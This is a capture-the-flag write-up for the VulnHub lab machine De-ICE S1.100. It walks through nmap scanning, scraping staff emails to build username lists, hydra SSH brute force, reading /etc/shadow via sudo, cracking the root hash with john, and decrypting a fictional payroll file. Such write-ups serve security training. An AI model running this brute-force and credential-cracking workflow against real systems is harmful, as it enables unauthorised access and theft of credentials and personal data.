# __De-ICE_S1.100__
[Link to vulnhub](https://www.vulnhub.com/entry/de-ice-s1100,8/)

## Reconnaissance
```
nmap -sS -O 192.168.1.0/24

Nmap scan report for 192.168.1.100
Host is up (0.00058s latency).
Not shown: 992 filtered ports
PORT    STATE  SERVICE
20/tcp  closed ftp-data
21/tcp  open   ftp
22/tcp  open   ssh
25/tcp  open   smtp
80/tcp  open   http
110/tcp open   pop3
143/tcp open   imap
443/tcp closed https
MAC Address: 00:0C:29:3F:3E:6E (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.13 - 2.6.32
Network Distance: 1 hop
```

## __Enumeration__
Nmap vulnerability scan
```
Nmap scan report for 192.168.1.100
Host is up (0.00035s latency).
Not shown: 65527 filtered ports
PORT    STATE  SERVICE  VERSION
20/tcp  closed ftp-data
21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)
|_ftp-libopie: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
25/tcp  open   smtp?
|_sslv2-drown: 
80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /info.php: Possible information file
|_  /icons/: Potentially interesting directory w/ listing on 'apache/2.0.55 (unix) php/5.1.2'
|_http-server-header: Apache/2.0.55 (Unix) PHP/5.1.2
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
110/tcp open   pop3     Openwall popa3d
|_sslv2-drown: 
143/tcp open   imap     UW imapd 2004.357
|_sslv2-drown: 
443/tcp closed https
```

By checking HTTP 80 it is nothing interesting.

By checking the hint and tools to be used in this machine. I found that hydra is one of specified tool so I assume that I may use hydra to brute force SSH service. The dictinary I'm going to use is rockyou.txt but the wordlist is very big (about 1.4 M words) so I have to scope username and password to be used for hydra. 

To scope usernames and password I will try to find email address and possible usernames from the website 192.168.1.100. I will use wget to recursively get whole site and grep for Email.
```
# wget -r http://192.168.1.100/

# grep -iE "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" *.*
copyright.txt:   twilhelm@herot.net
copyright.txt:   twilhelm@heorot.net    (business only)
index2.php:Head of HR:  Marie Mary - marym@herot.net (On Emergency Leave)<BR>
index2.php:Employee Pay:  Pat Patrick - patrickp@herot.net<BR>
index2.php:Travel Comp:  Terry Thompson - thompsont@herot.net<BR>
index2.php:Benefits:  Ben Benedict - benedictb@herot.net<BR>
index2.php:Director of Engineering:  Erin Gennieg - genniege@herot.net<BR>
index2.php:Project Manager:  Paul Michael - michaelp@herot.net<BR>
index2.php:Engineer Lead:  Ester Long - longe@herot.net<BR>
index2.php:Sr. System Admin:  Adam Adams - adamsa@herot.net<BR>
index2.php:System Admin (Intern): Bob Banter - banterb@herot.net<BR>
index2.php:System Admin:  Chad Coffee - coffeec@herot.net<BR>

So the email list is:

twilhelm@herot.net
twilhelm@heorot.net
marym@herot.net
patrickp@herot.net
thompsont@herot.net
benedictb@herot.net
genniege@herot.net
michaelp@herot.net
longe@herot.net
adamsa@herot.net
banterb@herot.net
coffeec@herot.net
```

If you familiar with corporate working you might notice that every email begins with name and followed by a character which could be the first character of their lastname. You should tweek this list by move that character to the front of their name also to increase possibility to find valid credential.

From email list, possible username are:
```
aadams
adamsa
admin
administrator
banterb
bbanter
bbenedict
benedictb
ccoffee
coffeec
egennieg
elong
genniege
longe
marym
michaelp
mmary
mtwilhel
patrickp
pmichael
ppatrick
root
thompsont
tthompson
twilhelm
webmaster
```


## __Exploit__
Then I will use this as dictionary for both username and password list if I got nothing I will use rockyou.txt as password list. Let's try.
```
hydra -s 22 -v -V -L lists.txt -P lists.txt -e n -t 5 -w 30  ssh://192.168.1.100

...
[22][ssh] host: 192.168.1.100   login: bbanter   password: bbanter
...
```

We got luck here, I tried to enumerate kernel version and got 2.6.16 which could exploit with many vulnerability to escalate my privilege to root. But I noticed that GCC package did not be installed so if I want to exploit it's kernel I have to compile an exploit outside and run it inside our target. So let's try another way first.

* check interactive shell
```
bbanter@slax:/tmp$ cat /etc/shells 
/bin/bash
/bin/ash
```

* check for /etc/passwd
```
bbanter@slax:~$ cat /etc/passwd 
root:x:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash
bin:x:1:1:bin:/bin:
daemon:x:2:2:daemon:/sbin:
adm:x:3:4:adm:/var/log:
lp:x:4:7:lp:/var/spool/lpd:
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/:
news:x:9:13:news:/usr/lib/news:
uucp:x:10:14:uucp:/var/spool/uucppublic:
operator:x:11:0:operator:/root:/bin/bash
games:x:12:100:games:/usr/games:
ftp:x:14:50::/home/ftp:
smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
rpc:x:32:32:RPC portmap user:/:/bin/false
sshd:x:33:33:sshd:/:
gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
pop:x:90:90:POP:/:
nobody:x:99:99:nobody:/:
aadams:x:1000:10:,,,:/home/aadams:/bin/bash
bbanter:x:1001:100:,,,:/home/bbanter:/bin/bash
ccoffee:x:1002:100:,,,:/home/ccoffee:/bin/bash
```

* check for users that could login via interactive shell
```
bbanter@slax:/tmp$ grep -iE "(/bin/ash|/bin/bash)" /etc/passwd
root:x:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash
operator:x:11:0:operator:/root:/bin/bash
mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
aadams:x:1000:10:,,,:/home/aadams:/bin/bash
bbanter:x:1001:100:,,,:/home/bbanter:/bin/bash
ccoffee:x:1002:100:,,,:/home/ccoffee:/bin/bash
```

* check for /etc/group
```
bbanter@slax:/tmp$ cat /etc/group
root::0:root
bin::1:root,bin,daemon
daemon::2:root,bin,daemon
sys::3:root,bin,adm
adm::4:root,adm,daemon
tty::5:
disk::6:root,adm
lp::7:lp
mem::8:
kmem::9:
wheel::10:root
floppy::11:root
mail::12:mail
news::13:news
uucp::14:uucp
man::15:
audio::17:
video::18:
cdrom::19:
games::20:
slocate::21:
utmp::22:
smmsp::25:smmsp
mysql::27:
rpc::32:
sshd::33:sshd
gdm::42:
shadow::43:
ftp::50:
pop::90:pop
scanner::93:
nobody::98:nobody
nogroup::99:
users::100:
console::101:
```

* Map users with their group
```
user > group

root > root
operator > floppy
mysql > mysql
gdm > gdm
aadams > wheel
bbanter > users
ccoffee > users
```

* Wheel group (https://en.wikipedia.org/wiki/Wheel_(Unix_term))
```
Modern Unix systems generally use user groups as a security protocol to control access privileges. The wheel group is a special user group used on some Unix systems to control access to the sudo command
```

The user aadams is in wheel group so I tried to brute force aadams again with rockyou.txt now.

```
hydra -s 22 -v -V -l aadams -P /usr/share/wordlists/rockyou.txt -e n -t 10 -w 30  ssh://192.168.1.100

...
[22][ssh] host: 192.168.1.100   login: aadams   password: nostradamus
...

root@BOEING:~# ssh aadams@192.168.1.100
aadams@192.168.1.100's password: 
Linux 2.6.16.
aadams@slax:~$ 
aadams@slax:~$ id
uid=1000(aadams) gid=10(wheel) groups=10(wheel)
```

* List commands which could by executed by sudo
```
aadams@slax:~$ sudo -l
User aadams may run the following commands on this host:
    (root) NOEXEC: /bin/ls
    (root) NOEXEC: /usr/bin/cat
    (root) NOEXEC: /usr/bin/more
    (root) NOEXEC: !/usr/bin/su *root*
```

## __Privilege escalation__
* Cat /etc/shadow
```
aadams@slax:~$ sudo cat /etc/shadow
root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
adm:*:9797:0:::::
lp:*:9797:0:::::
sync:*:9797:0:::::
shutdown:*:9797:0:::::
halt:*:9797:0:::::
mail:*:9797:0:::::
news:*:9797:0:::::
uucp:*:9797:0:::::
operator:*:9797:0:::::
games:*:9797:0:::::
ftp:*:9797:0:::::
smmsp:*:9797:0:::::
mysql:*:9797:0:::::
rpc:*:9797:0:::::
sshd:*:9797:0:::::
gdm:*:9797:0:::::
pop:*:9797:0:::::
nobody:*:9797:0:::::
aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:13550:0:99999:7:::
bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:13550:0:99999:7:::
ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::
```

* Cracking password
```
root@BOEING:# vi passwd
root@BOEING:# vi shadow
root@BOEING:# unshadow passwd shadow > unshadow
```

I removed other user from unshadow file and crack password for root user only
```
root@BOEING:# john --wordlist=/usr/share/wordlists/rockyou.txt unshadow_root

...
tarot            (root)
...

aadams@slax:~$ su
Password: *****
root@slax:/home/aadams# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
```

The secret file found in /home/ftp/incoming
```
root@slax:~# ls -al /home/ftp/incoming/
total 140
dr-xr-xr-x 2 root root     80 Jun 29  2007 .
drwx------ 3 root root     60 Jun 29  2007 ..
-r-xr-xr-x 1 root root 133056 Jun 29  2007 salary_dec2003.csv.enc
```

* Decrypt the file
```
root@slax:~# openssl enc -d -aes-128-cbc -in /home/ftp/incoming/salary_dec2003.csv.enc -k tarot -out /tmp/salary_dec2003.csv
root@slax:~# more /tmp/salary_dec2003.csv
,Employee information,,,,,,,,,,,,,,
,Employee ID,Name,Salary,Tax Status,Federal Allowance (From W-4),State Tax (Percentage),Federal Income Tax (Percentage based on Federal Allowance),Social 
Security Tax (Percentage),Medicare Tax (Percentage),Total Taxes Withheld (Percentage),"Insurance
Deduction
(Dollars)","Other Regular
Deduction
(Dollars)","Total Regular Deductions (Excluding taxes, in dollars)","Direct Deposit Info
Routing Number","Direct Deposit Info
Account Number"
,1,Charles E. Ophenia,"$225,000.00",1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$360.00,$500.00,$860.00,183200299,1123245
,2,Marie Mary,"$56,000.00",1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$100.00,$225.00,183200299,1192291
,3,Pat Patrick,"$43,350.00",1,1,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,2334432
,4,Terry Thompson,"$27,500.00",1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$225.00,$350.00,183200299,1278235
,5,Ben Benedict,"$29,750.00",1,3,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$122.50,$247.50,183200299,2332546
,6,Erin Gennieg,"$105,000.00",1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,1456567
,7,Paul Michael,"$76,000.00",1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$100.00,$225.00,183200299,1446756
,8,Ester Long,"$92,500.00",1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,1776782
,9,Adam Adams,"$76,250.00",1,5,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,2250900
,10,Chad Coffee,"$55,000.00",1,1,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,1590264
,11,,,,,,,,,0.00%,,,$0.00,0,0
,12,,,,,,,,,0.00%,,,$0.00,0,0
,13,,,,,,,,,0.00%,,,$0.00,0,0
,14,,,,,,,,,0.00%,,,$0.00,0,0
,15,,,,,,,,,0.00%,,,$0.00,0,0
,16,,,,,,,,,0.00%,,,$0.00,0,0
,17,,,,,,,,,0.00%,,,$0.00,0,0
,18,,,,,,,,,0.00%,,,$0.00,0,0
,19,,,,,,,,,0.00%,,,$0.00,0,0
,20,,,,,,,,,0.00%,,,$0.00,0,0
,21,,,,,,,,,0.00%,,,$0.00,0,0
,22,,,,,,,,,0.00%,,,$0.00,0,0
,23,,,,,,,,,0.00%,,,$0.00,0,0
,24,,,,,,,,,0.00%,,,$0.00,0,0
,25,,,,,,,,,0.00%,,,$0.00,0,0
```